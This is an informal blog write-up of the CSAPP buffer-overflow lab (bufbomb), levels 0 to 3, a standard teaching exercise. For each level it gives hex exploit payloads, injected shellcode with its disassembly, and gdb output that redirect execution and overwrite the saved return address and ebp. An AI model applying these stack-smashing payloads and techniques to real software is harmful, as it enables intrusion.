---
title: csapp_buflab
date: 2021-04-28 17:56:27
tags:
---

my  fourth week challange!

i have some eggs hurt today i wanna try to use eg to write my note

(maybe is will be funny?)

<!--more-->

## level0:smoke

```
void __noreturn smoke()
{
  puts("Smoke!: You called smoke()");
  validate(0);
  exit(0);
}
```

just we can see on these codes,we need use function of getbuf to overflow turn to smoke()

now let me put on my exp(according to getbuf() we can know Variable distance EBP is 44,the smoke() location is 0x08048c18)

exp0:

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 18 8c 04 08        
```

use these commands to run (i am lovely please give me money,this world can be replaced)

```
./hex2raw < Level0.txt > Level0-raw.txt
./bufbomb -u i am lovely please give me money < Level0-raw.txt
```



## level1:fizz

level1 has some differents frowm level0,except we should use stack overflow and we should deliver a cookie to pass it 

```
void __cdecl __noreturn fizz(int a1)
{
  if ( a1 == cookie )
  {
    __printf_chk(1, "Fizz!: You called fizz(0x%x)\n", a1);
    validate(1);
  }
  else
  {
    __printf_chk(1, "Misfire: You called fizz(0x%x)\n", a1);
  }
  exit(0);
```

but know we have one question where should we put this cookie

in other world what is the fizz variable a1 location

let we see about this we can see a1(arg_0) distance ebp +8

```
00000018
-00000018                 db ? ; undefined
-00000017                 db ? ; undefined
-00000016                 db ? ; undefined
-00000015                 db ? ; undefined
-00000014                 db ? ; undefined
-00000013                 db ? ; undefined
-00000012                 db ? ; undefined
-00000011                 db ? ; undefined
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C                 db ? ; undefined
-0000000B                 db ? ; undefined
-0000000A                 db ? ; undefined
-00000009                 db ? ; undefined
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 arg_0           dd ?
+0000000C
+0000000C ; end of stack variables
```

ok let me put on my exp

```
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
42 8c 04 08#fizz
00 00 00 00 
07 a7 06 4e#vaule of cookie
```

ps:This cookie varies from person to person



## level2:Firecracker

will now we arrive level2,we need use stack overflow turn to bang and make this global_vaule==cookie (damn,if i can use pwntools it will be very easy.)

```
void __noreturn bang()
{
  if ( global_value == cookie )
  {
    __printf_chk(1, "Bang!: You set global_value to 0x%x\n", global_value);
    validate(2);
  }
  else
  {
    __printf_chk(1, "Misfire: global_value = 0x%x\n", global_value);
  }
  exit(0);
}
```

We can know the address we hold global variables is 0x0804D100

```
.bss:0804D100 global_value    dd ?                    ; DATA XREF: bang+6↑r
```

ok let we go,now we can use one gadget to fix it vaule

```
movl $0x4e06a707,0x804d100  #change vaule
push $0x8048c9d             
ret                         #push and ret just like call
```

machine code

```
q@linux:~$ gcc -c 3.s
q@linux:~$ objdump -d 3.o

3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	c7 04 25 00 d1 04 08 	movl   $0x4e06a707,0x804d100
   7:	07 a7 06 4e 
   b:	68 9d 8c 04 08       	pushq  $0x8048c9d
  10:	c3     
```

then we need use gdb to find the location of write funtion**(eax stores the return value, so we change the return value here to the code we passed above)**

```
pwndbg> r -u i am lovely please give me money
Starting program: /home/q/bufbomb -u i am lovely please give me money
Userid: i
Cookie: 0x4e06a707

Breakpoint 1, 0x08049200 in getbuf ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]─────────────────────────────────
 EAX  0x556834d8 (_reserved+1037528) —▸ 0xf7fb8890 (_IO_stdfile_1_lock) ◂— 0x0

```

```
b *0x8049200
```

so my exp is 

```
c7 04 25 00 d1 04 08 07
a7 06 4e 68 9d 8c 04 08
c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 d8 34 68 55#eax
```



## level3:Dynamite

oh my brain is boom,levle3 need we first return the cookie to test()

and then reduction ebp =-= have some strange? 

in the level2 i had pointed **(eax stores the return value)**

so we can put cookie in eax

when we change a vaule we will have a new ebp,but now we need that old ebp so we can use gdb to find it



```
b *0x8048db9
```

i have to say pwngdb+pwndbg are so good

we can see that old ebp is 0x55683530

```
pwndbg> r -u i
Starting program: /home/q/bufbomb -u i
Userid: i
Cookie: 0x4e06a707

Breakpoint 1, 0x08048db9 in test ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]─────────────────────────────────
 EAX  0x14c87578
 EBX  0x0
 ECX  0xf7fb7074 (randtbl+20) ◂— 0xb900745c /* '\\t' */
 EDX  0x0
 EDI  0x1
 ESI  0x55686580 ◂— 0x0
 EBP  0x55683530 (_reserved+1037616) —▸ 0x55685ff0 (_reserved+1048560) —▸ 0xffffd178 —▸ 0xffffd1b8 ◂— 0x0

```

next step

```
q@linux:~$ gcc -c 3.s
q@linux:~$ objdump -d 3.o

3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	b8 07 a7 06 4e       	mov    $0x4e06a707,%eax
   5:	68 b9 8d 04 08       	pushq  $0x8048db9
   a:	c3                   	retq   
```

exp

```
b8 07 a7 06 
4e 68 b9 8d 
04 08 c3 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
30 35 68 55#old ebp
d8 34 68 55#rax
```



level4:=-= i can not do it 